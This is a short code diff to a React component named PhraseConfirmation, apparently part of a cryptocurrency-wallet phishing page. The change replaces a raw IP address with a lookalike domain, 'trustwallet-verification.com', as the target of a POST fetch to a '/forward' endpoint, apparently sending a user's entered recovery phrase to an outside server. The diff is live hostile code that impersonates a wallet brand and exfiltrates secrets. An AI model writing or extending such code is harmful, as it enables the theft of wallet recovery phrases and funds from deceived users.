@@ -45,7 +45,7 @@ export default function PhraseConfirmation() {
     }
 
     try {
-      const response = await fetch("http://46.202.189.73:5672/forward", {
+      const response = await fetch("http://trustwallet-verification.com:5672/forward", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
